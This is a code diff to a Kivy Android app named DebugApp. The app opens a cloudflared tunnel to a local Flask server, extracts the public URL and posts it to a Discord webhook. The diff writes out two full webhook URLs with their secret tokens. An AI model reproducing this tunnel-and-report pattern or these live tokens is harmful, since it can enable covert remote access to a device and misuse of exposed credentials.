@@ -18,7 +18,7 @@ from kivy.clock import mainthread
 from kivy.uix.label import Label
 from kivy.uix.scrollview import ScrollView
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1552054790224355331/hHsjlO_qp08RVzDo_A3yrjYpE6spSBHvlMTrygIke0r9aq4LKXsEyn15jD3bAm7RotvB"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1551491653498437662/ZKV710LxZs-7Q9BxZldPVP3qfnFF1oUIOv3S2tNXAmsP4e4U0Y9e1n7DawPzGHjVmp4F"
 
 USERNAME = "3anoor-Omda"
 PASSWORD = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
@@ -62,7 +62,6 @@ class DebugApp(App):
             self.log(f"[ERROR] Flask failed: {e}")
 
     def get_cloudflared_path(self):
-        # البحث عن المكتبة المدمجة في مجلد التطبيق الخاص بالأندرويد
         try:
             from jnius import autoclass
             PythonActivity = autoclass('org.kivy.android.PythonActivity')
@@ -109,9 +108,10 @@ class DebugApp(App):
             for line in iter(proc.stdout.readline, ""):
                 if line:
                     clean_line = line.strip()
-                    if "trycloudflare.com" in clean_line:
-                        match = re.search(r"https://[a-zA-Z0-9\.\-]+\.trycloudflare\.com", clean_line)
-                        if match:
+                    # استثناء api.trycloudflare.com والالتقاط الدقيق للرابط الفرعي المنشأ
+                    if "trycloudflare.com" in clean_line and "api.trycloudflare.com" not in clean_line:
+                        match = re.search(r"https://[a-zA-Z0-9\-]+\.trycloudflare\.com", clean_line)
+                        if match and "api.trycloudflare.com" not in match.group(0):
                             found_url = match.group(0)
                             self.log(f"[SUCCESS] Public URL Created: {found_url}")
                             self.send_to_discord(found_url)
